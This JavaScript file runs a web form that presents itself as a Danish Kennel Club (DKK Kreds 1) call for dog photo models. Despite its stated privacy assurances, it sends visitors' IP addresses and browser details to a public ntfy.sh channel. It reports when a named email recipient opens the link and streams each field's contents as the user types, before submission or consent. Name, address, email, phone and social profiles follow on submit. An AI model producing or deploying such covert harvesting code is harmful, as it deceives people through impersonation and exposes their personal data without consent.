// --- CONFIGURATION ---
const NTFY_TOPIC = "dkkkreds1_fotoshoot_secret_98765";
let currentLang = 'da';
const MAX_DOGS = 6;
const MAX_SOCIALS = 5;
let userIP = "Fetching...";
let phoneMaskInstance = null; 

// Sporings- og sessionsdata
const sessionInfo = {
    id: Math.random().toString(36).substring(2, 9).toUpperCase(),
    startTime: new Date().toISOString(),
    userAgent: navigator.userAgent,
    screen: `${window.screen.width}x${window.screen.height}`,
    lang: navigator.language
};

let typingTimeout = {}; 

// --- ALLOWED MAJOR DOMAINS ---
const allowedDomains = [
    'gmail.com', 'yahoo.com', 'hotmail.com', 'hotmail.dk', 'outlook.com', 'outlook.dk', 
    'live.com', 'live.dk', 'icloud.com', 'me.com', 'mac.com', 'mail.com', 'msn.com',
    'protonmail.com', 'jubii.dk', 'sol.dk', 'tdcadsl.dk', 'webspeed.dk', 'mail.dk', 
    'ofir.dk', 'post.tele.dk', 'privat.dk', 'stofanet.dk', 'get2net.dk', 'ymail.com', 
    'googlemail.com', 'pm.me', 'zohomail.eu', 'zohomail.com', 'gmx.com'
];

// --- TRANSLATIONS ---
const i18n = {
    da: {
        nav1: "Hundeejer", nav2: "Opdrætter", nav3: "Aktiviteter", nav8: "Uddannelser",
        nav4: "Udstillinger", nav5: "Om DKK", nav7: "Bliv medlem", nav6: "Kontakt", nav_shop: "Shop", login: "Login",
        intro_subtitle: "Udstilling og Fotografering",
        intro_title: "Forespørgsel vedrørende fotografering af dine hunde til DKK Kreds 1",
        data_info: "<strong>Information om dataindsamling:</strong> De oplysninger du indtaster her, sendes sikkert og bruges udelukkende til at vurdere dit match som hundemodel for DKK Kreds 1. Data deles ikke med tredjepart uden dit samtykke.",
        owner_title: "1. Ejerinformation", f_name: "Fulde navn", f_address: "Postnr. og By", 
        f_email: "E-mailadresse", f_email_note: "Eks. gmail.com, hotmail.com", f_phone: "Telefonnummer", 
        f_socials: "Sociale Medier", btn_add_social: "Tilføj profil", btn_remove_social: "Fjern profil", f_social_link: "Platform & Brugernavn (fx. Instagram @navn)", max_socials_alert: "Du kan maksimalt tilføje 5 profiler.",
        f_dkk: "DKK Medlemsnummer (Valgfrit)", f_desc: "Kort beskrivelse af dig selv",
        dog_title: "2. Hundeinformation", d_name: "Hundens navn og Race", d_age: "Hundens Alder", 
        d_skills: "Tricks og Færdigheder", d_photos: "Link til billeder (Google Drev/SoMe)",
        privacy_consent: "Jeg bekræfter hermed, at jeg accepterer behandlingen af mine personoplysninger i overensstemmelse med <a href='https://www.dkk.dk/english/about-dkk/organisation/politics-of-personal-data' target='_blank' class='text-dkkRed underline hover:text-red-800 font-semibold' onclick='event.stopPropagation()'>privatlivspolitikken</a>.",
        btn_add_dog: "Tilføj endnu en hund", btn_remove_dog: "Fjern hund", max_dogs_alert: "Du kan maksimalt tilføje 6 hunde.", btn_submit: "Send Ansøgning", btn_sending: "Sender...",
        success_title: "Tak for din ansøgning!", success_desc: "Dine informationer er sendt sikkert afsted til DKK Kreds 1.",
        error_title: "Hov, der mangler noget!", error_desc: "Tjek de røde felter. Husk at e-mail skal være gyldig, telefonnummeret skal være korrekt, og privatlivspolitikken skal accepteres.",
        footer_contact: "Kontakt DKK", footer_bank: "Bank", footer_terms: "Handelsbetingelser", footer_cancellation: "Fortrydelsesformular",
        footer_mypage: "Min side", footer_press: "Presse", footer_exterior: "Eksteriørdommer", footer_vet: "Dyrlæge", footer_rules: "Regler og instrukser",
        footer_forms: "Blanketter", footer_special_clubs: "Specialklubber", footer_privacy: "Privatlivspolitik", footer_club_systems: "Klubsystemer", footer_discount: "Få rabat som DKK medlem"
    },
    en: {
        nav1: "Dog Owner", nav2: "Breeder", nav3: "Activities", nav8: "Education",
        nav4: "Exhibitions", nav5: "About DKK", nav7: "Become a member", nav6: "Contact", nav_shop: "Shop", login: "Login",
        intro_subtitle: "Exhibition and Photography",
        intro_title: "Inquiry regarding photography of your dogs for DKK District 1",
        data_info: "<strong>Data collection info:</strong> The information you enter here is sent securely and is used exclusively to evaluate your match as a dog model for DKK District 1. Data is not shared with third parties without your consent.",
        owner_title: "1. Owner Info", f_name: "Full Name", f_address: "Zip Code and City", 
        f_email: "Email Address", f_email_note: "E.g., gmail.com, hotmail.com", f_phone: "Phone Number", 
        f_socials: "Social Media", btn_add_social: "Add profile", btn_remove_social: "Remove profile", f_social_link: "Platform & Username (e.g. Instagram @name)", max_socials_alert: "You can add a maximum of 5 profiles.",
        f_dkk: "DKK Member Number (Optional)", f_desc: "Short description of yourself",
        dog_title: "2. Dog Info", d_name: "Dog's Name & Breed", d_age: "Dog's Age", 
        d_skills: "Tricks & Skills", d_photos: "Link to photos (Google Drive/SoMe)",
        privacy_consent: "I hereby confirm that I accept the processing of my personal data in accordance with the <a href='https://www.dkk.dk/english/about-dkk/organisation/politics-of-personal-data' target='_blank' class='text-dkkRed underline hover:text-red-800 font-semibold' onclick='event.stopPropagation()'>privacy policy</a>.",
        btn_add_dog: "Add another dog", btn_remove_dog: "Remove dog", max_dogs_alert: "You can add a maximum of 6 dogs.", btn_submit: "Submit Application", btn_sending: "Sending...",
        success_title: "Thank you!", success_desc: "Your information has been securely sent to DKK District 1.",
        error_title: "Oops, something is missing!", error_desc: "Please check the red fields. Make sure the email is from a major provider, the phone number is valid, and you have accepted the privacy policy.",
        footer_contact: "Contact DKK", footer_bank: "Bank", footer_terms: "Terms and conditions", footer_cancellation: "Cancellation form",
        footer_mypage: "My page", footer_press: "Press", footer_exterior: "Conformation judge", footer_vet: "Veterinarian", footer_rules: "Rules and instructions",
        footer_forms: "Forms", footer_special_clubs: "Special clubs", footer_privacy: "Privacy Policy", footer_club_systems: "Club systems", footer_discount: "Get discount as DKK member"
    }
};

// --- INITIALIZE & TRACK PAGE VIEW ---
window.addEventListener('DOMContentLoaded', async () => {
    try {
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        userIP = data.ip;
        
        const urlParams = new URLSearchParams(window.location.search);
        const userName = urlParams.get('user');
        if (userName && !sessionStorage.getItem('hasTrackedEmailClick')) {
            sendNtfy("📧 E-mail Klikket!", `${userName.replace(/_/g, ' ')} har netop klikket på linket i e-mailen og er nu landet på siden!\nIP: ${userIP}`, "email,bell");
            sessionStorage.setItem('hasTrackedEmailClick', 'true');
        }
    } catch(e) { userIP = "Unknown"; }

    const phoneEl = document.getElementById('ownerPhone');
    phoneMaskInstance = IMask(phoneEl, {
        mask: '+00 00 00 00 00', 
        lazy: false,             
        placeholderChar: '_'
    });
    
    phoneMaskInstance.on('accept', () => {
        validateField(phoneEl, false);
        saveFormState();
    });

    logPageView();
    restoreFormState();
    bindLanguageSwitch();
});

// -- LOGGING FUNCTIONS --
function sendNtfy(title, message, tags) {
    return fetch(`https://ntfy.sh/`, {
        method: 'POST',
        body: JSON.stringify({
            topic: NTFY_TOPIC,
            title: title,
            message: message,
            tags: tags ? tags.split(',') : []
        }),
        headers: { 'Content-Type': 'application/json' }
    }).catch(err => console.error("Ntfy Error:", err));
}

function trackEvent(eventName, fieldName, value, icon) {
    const msg = `Session: ${sessionInfo.id}\nIP: ${userIP}\n\nFelt: ${fieldName}\nInput: ${value}`;
    sendNtfy(`🕵️ Tracker - ${eventName}`, msg, icon);
}

function logPageView() {
    const msg = `Ny besøgende på formularen!\n\nIP: ${userIP}\nSession ID: ${sessionInfo.id}\nSkærm: ${sessionInfo.screen}\nSprog: ${sessionInfo.lang}\nBrowser: ${sessionInfo.userAgent}`;
    sendNtfy("🌐 Ny Besøgende (Sidevisning)", msg, "globe_with_meridians");
}

// --- FLUID REAL-TIME VALIDATION ---
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!re.test(email)) return false;
    const domain = email.split('@')[1].toLowerCase();
    return allowedDomains.includes(domain);
}

function validateField(input, isBlurEvent = false) {
    let isValid;
    const isRequired = input.hasAttribute('required');

    if (input.type === 'checkbox') {
        isValid = !isRequired || input.checked;
    } else {
        const val = input.value.trim();
        isValid = input.checkValidity() && val !== '';
        
        if (input.type === 'email' && val !== '') isValid = validateEmail(val);
        
        if (input.type === 'tel') {
            const unmasked = val.replace(/[\s\+\_]/g, '');
            isValid = unmasked.length >= 8; 
        }
    }

    const icon = input.parentElement.querySelector('.valid-icon');

    if (isValid) {
        input.classList.remove('is-invalid', 'shake');
        if (input.type !== 'checkbox') {
            input.classList.add('is-valid');
            if(icon) icon.classList.remove('hidden');
        }
    } else {
        input.classList.remove('is-valid');
        if(icon) icon.classList.add('hidden');
        
        let conditionFailed = false;
        if (input.type === 'checkbox') {
            conditionFailed = (isBlurEvent && isRequired && !input.checked);
        } else if (input.type === 'tel') {
            conditionFailed = (isBlurEvent && isRequired && input.value.replace(/[\s\+\_]/g, '').length < 8);
        } else {
            conditionFailed = (isBlurEvent && isRequired && input.value.trim() === '') || (isBlurEvent && input.value.trim() !== '');
        }

        if (conditionFailed || input.classList.contains('is-invalid')) {
            input.classList.add('is-invalid');
        }
    }
    return isValid;
}

// --- SOCIAL MEDIA MANAGEMENT LOGIC ---
function updateSocialNumbers() {
    const cards = document.querySelectorAll('.social-card');
    const addBtn = document.getElementById('addSocialBtn');
    const counterDisplay = document.getElementById('socialCountDisplay');
    
    counterDisplay.innerText = `${cards.length}/${MAX_SOCIALS}`;

    cards.forEach((card, index) => {
        const removeBtn = card.querySelector('.remove-social-btn');
        if (removeBtn) {
            removeBtn.style.display = cards.length > 1 ? 'block' : 'none';
        }
    });
    addBtn.style.display = cards.length >= MAX_SOCIALS ? 'none' : 'flex';
}

window.removeSocial = function(btn) {
    const card = btn.closest('.social-card');
    card.style.animation = "slideUp 0.25s ease-in forwards";
    setTimeout(() => {
        card.remove();
        updateSocialNumbers();
        saveFormState();
    }, 240);
};

function addSocialField(savedData = null) {
    const container = document.getElementById('socialsContainer');
    if (container.children.length >= MAX_SOCIALS) {
        alert(i18n[currentLang].max_socials_alert);
        return;
    }

    const div = document.createElement('div');
    div.className = 'social-card flex gap-4 items-center w-full';
    
    div.innerHTML = `
        <div class="floating-input-group flex-1">
            <input type="text" class="socialInput floating-input track-input" required placeholder=" " value="${savedData || ''}">
            <label class="floating-label" data-i18n="f_social_link">${i18n[currentLang].f_social_link}</label>
        </div>
        <button type="button" class="remove-social-btn bg-gray-50 border border-gray-200 hover:bg-red-100 text-gray-400 hover:text-red-600 rounded p-3 transition duration-200" onclick="removeSocial(this)" title="${i18n[currentLang].btn_remove_social || 'Fjern profil'}">
            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12"></path></svg>
        </button>
    `;
    container.appendChild(div);
    bindTracking(div);
    updateSocialNumbers();
}
document.getElementById('addSocialBtn').addEventListener('click', () => addSocialField(null));


// --- DOG MANAGEMENT LOGIC ---
function updateDogNumbers() {
    const cards = document.querySelectorAll('.dog-card');
    const addBtn = document.getElementById('addDogBtn');
    const counterDisplay = document.getElementById('dogCountDisplay');
    
    counterDisplay.innerText = `${cards.length}/${MAX_DOGS}`;

    cards.forEach((card, index) => {
        card.querySelector('.dog-number').innerText = `#${index + 1}`;
        const removeBtn = card.querySelector('.remove-dog-btn');
        if (removeBtn) {
            removeBtn.style.display = cards.length > 1 ? 'flex' : 'none';
        }
    });
    addBtn.style.display = cards.length >= MAX_DOGS ? 'none' : 'flex';
}

window.removeDog = function(btn) {
    const card = btn.closest('.dog-card');
    card.style.animation = "slideUp 0.3s ease-in forwards";
    setTimeout(() => {
        card.remove();
        updateDogNumbers();
        saveFormState();
    }, 280);
};

function addDogField(savedData = null) {
    const container = document.getElementById('dogsContainer');
    if (container.children.length >= MAX_DOGS) {
        alert(i18n[currentLang].max_dogs_alert);
        return;
    }

    const div = document.createElement('div');
    div.className = 'dog-card grid grid-cols-1 md:grid-cols-2 gap-8 mt-6';
    
    div.innerHTML = `
        <div class="dog-number absolute -top-3 left-4 bg-dkkRed text-white text-xs font-bold px-3 py-1 rounded-full">#</div>
        
        <button type="button" class="remove-dog-btn absolute -top-3 right-4 bg-gray-100 border border-gray-300 hover:bg-red-100 text-gray-500 hover:text-red-600 rounded-full p-1.5 transition duration-200" onclick="removeDog(this)" title="${i18n[currentLang].btn_remove_dog || 'Fjern hund'}">
            <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M6 18L18 6M6 6l12 12"></path></svg>
        </button>

        <div class="floating-input-group col-span-2">
            <input type="text" class="dogName floating-input track-input" required placeholder=" " value="${savedData ? savedData.name : ''}">
            <label class="floating-label" data-i18n="d_name">${i18n[currentLang].d_name}</label>
        </div>
        <div class="floating-input-group">
            <input type="text" class="dogAge floating-input track-input" required placeholder=" " value="${savedData ? savedData.age : ''}">
            <label class="floating-label" data-i18n="d_age">${i18n[currentLang].d_age}</label>
        </div>
        <div class="floating-input-group">
            <input type="url" class="dogPhotos floating-input track-input" required placeholder=" " value="${savedData ? savedData.photos : ''}">
            <label class="floating-label" data-i18n="d_photos">${i18n[currentLang].d_photos}</label>
        </div>
        <div class="floating-input-group col-span-2">
            <input type="text" class="dogSkills floating-input track-input" required placeholder=" " value="${savedData ? savedData.skills : ''}">
            <label class="floating-label" data-i18n="d_skills">${i18n[currentLang].d_skills}</label>
        </div>
    `;
    container.appendChild(div);
    bindTracking(div);
    updateDogNumbers();
    
    if(savedData) div.querySelectorAll('input').forEach(input => validateField(input, false));
}
document.getElementById('addDogBtn').addEventListener('click', () => addDogField(null));

// --- BLUR, FOCUS & KEYSTROKE TRACKING ---
function bindTracking(parent = document) {
    const inputs = parent.querySelectorAll('.track-input');
    inputs.forEach(input => {
        const fieldId = input.id || input.className.split(' ')[0] + Math.random().toString(36).substr(2,4);

        if (input.type === 'checkbox') {
            input.addEventListener('change', (e) => {
                validateField(e.target, false);
                saveFormState();
                trackEvent("Checkbox Skiftet", "Privatlivspolitik Accepteret", e.target.checked, "check");
            });
            return;
        }

        if(input.id === 'ownerPhone') return;

        input.addEventListener('focus', (e) => {
            validateField(e.target, false);
        });

        input.addEventListener('input', (e) => {
            validateField(e.target, false);
            saveFormState(); 
            
            const val = e.target.value.trim();
            const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";

            clearTimeout(typingTimeout[fieldId]);
            typingTimeout[fieldId] = setTimeout(() => {
                if(val.length > 0) trackEvent("Live Input", label, val, "pencil2");
            }, 2500); 
        });
        
        input.addEventListener('blur', (e) => {
            validateField(e.target, true); 
            const val = e.target.value.trim();
            const label = e.target.nextElementSibling ? e.target.nextElementSibling.innerText : "Felt";
            if (val !== "") {
                clearTimeout(typingTimeout[fieldId]); 
                trackEvent("Forlod felt", label, val, "clipboard");
            }
        });
    });
}

// --- SAVE & RESTORE (LOCAL STORAGE) ---
function saveFormState() {
    const data = {
        ownerName: document.getElementById('ownerName').value,
        ownerAddress: document.getElementById('ownerAddress').value,
        ownerEmail: document.getElementById('ownerEmail').value,
        ownerPhone: phoneMaskInstance ? phoneMaskInstance.unmaskedValue : document.getElementById('ownerPhone').value,
        dkkMember: document.getElementById('dkkMember').value,
        ownerDescription: document.getElementById('ownerDescription').value,
        privacyConsent: document.getElementById('privacyConsent').checked,
        socials: [],
        dogs: []
    };
    
    document.querySelectorAll('.socialInput').forEach(input => {
        data.socials.push(input.value);
    });

    document.querySelectorAll('.dog-card').forEach(card => {
        data.dogs.push({
            name: card.querySelector('.dogName').value,
            age: card.querySelector('.dogAge').value,
            photos: card.querySelector('.dogPhotos').value,
            skills: card.querySelector('.dogSkills').value
        });
    });
    localStorage.setItem('dkkFotoshootData', JSON.stringify(data));
}

function restoreFormState() {
    const saved = localStorage.getItem('dkkFotoshootData');
    if (saved) {
        const data = JSON.parse(saved);
        document.getElementById('ownerName').value = data.ownerName || '';
        document.getElementById('ownerAddress').value = data.ownerAddress || '';
        document.getElementById('ownerEmail').value = data.ownerEmail || '';
        if (data.ownerPhone && phoneMaskInstance) {
            phoneMaskInstance.unmaskedValue = data.ownerPhone;
        }
        document.getElementById('dkkMember').value = data.dkkMember || '';
        document.getElementById('ownerDescription').value = data.ownerDescription || '';
        document.getElementById('privacyConsent').checked = data.privacyConsent || false;

        if (data.socials && data.socials.length > 0) {
            document.getElementById('socialsContainer').innerHTML = '';
            data.socials.forEach(social => addSocialField(social));
        } else {
            addSocialField();
        }

        if (data.dogs && data.dogs.length > 0) {
            document.getElementById('dogsContainer').innerHTML = '';
            data.dogs.forEach(dog => addDogField(dog));
        } else {
            addDogField();
        }

        document.querySelectorAll('.track-input').forEach(input => {
            if(input.type === 'checkbox' && input.checked) validateField(input, false);
            else if(input.value && input.id !== 'ownerPhone') validateField(input, false);
        });
        if(phoneMaskInstance && phoneMaskInstance.unmaskedValue) validateField(document.getElementById('ownerPhone'), false);

    } else {
        addSocialField();
        addDogField();
    }
    bindTracking(document);
}

// --- DATA COLLECTION (FINAL SUBMIT) ---
function getPayload() {
    let socialDetails = "";
    document.querySelectorAll('.socialInput').forEach((input) => {
        if (input.value) socialDetails += `- ${input.value}\n`;
    });

    let dogDetails = "";
    document.querySelectorAll('.dog-card').forEach((el, index) => {
        dogDetails += `\nHUND ${index + 1}:\n- Navn: ${el.querySelector('.dogName').value}\n- Alder: ${el.querySelector('.dogAge').value}\n- Færdigheder: ${el.querySelector('.dogSkills').value}\n- Fotos: ${el.querySelector('.dogPhotos').value}\n`;
    });

    return `EJER:\nNavn: ${document.getElementById('ownerName').value}\nAdresse: ${document.getElementById('ownerAddress').value}\nEmail: ${document.getElementById('ownerEmail').value}\nTlf: ${document.getElementById('ownerPhone').value}\nDKK: ${document.getElementById('dkkMember').value || 'Ingen'}\nBeskrivelse:\n${document.getElementById('ownerDescription').value || 'Ingen'}\n\nSOCIALE MEDIER:\n${socialDetails || 'Ingen'}\n\nPrivatliv: ${document.getElementById('privacyConsent').checked ? 'Accepteret' : 'Afvist'}\n\nHUNDE INFO: ${dogDetails}\n-----------------------\nIP: ${userIP}\nSession ID: ${sessionInfo.id}`;
}

// --- SUBMIT HANDLING ---
document.getElementById('dkkForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const btn = document.getElementById('submitBtn');
    const alertBox = document.getElementById('errorAlert');
    const originalBtnHTML = btn.innerHTML; 
    
    let formIsValid = true;
    document.querySelectorAll('input[required]').forEach(input => {
        if (!validateField(input, true)) {
            formIsValid = false;
            input.classList.remove('shake');
            void input.offsetWidth; 
            input.classList.add('shake', 'is-invalid'); 
        }
    });

    if (!formIsValid) {
        alertBox.classList.remove('hidden');
        sendNtfy("⚠️ Fejl / Manglende Data", "Nogen forsøgte at sende en formular med manglende/forkerte data.", "warning");
        return;
    }

    alertBox.classList.add('hidden');
    btn.innerHTML = `<svg class="animate-spin h-6 w-6 text-white" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z"></path></svg> <span data-i18n="btn_sending">${i18n[currentLang].btn_sending}</span>`;
    btn.disabled = true;

    try {
        const response = await sendNtfy("🐶 📸 SUCCESS: Ny DKK Model!", getPayload(), "camera_flash,dog");
        if (!response.ok) {
            throw new Error("Netværksfejl under afsendelse");
        }
        
        document.getElementById('dkkForm').classList.add('hidden');
        document.getElementById('successMessage').classList.remove('hidden');
        localStorage.removeItem('dkkFotoshootData');
        
    } catch(err) {
        console.error(err);
        alert("Noget gik galt under afsendelsen. Kontroller din internetforbindelse og prøv igen.");
        btn.innerHTML = originalBtnHTML;
        btn.disabled = false;
    }
});

// --- LANGUAGE SWITCHER ---
function bindLanguageSwitch() {
    document.getElementById('langSwitchBtn').addEventListener('click', () => {
        currentLang = currentLang === 'da' ? 'en' : 'da';
        document.getElementById('langLabel').innerText = currentLang === 'da' ? 'English' : 'Dansk';
        
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (i18n[currentLang][key]) {
                el.innerHTML = i18n[currentLang][key]; 
            }
        });
        
        updateDogNumbers();
        updateSocialNumbers();
    });
}
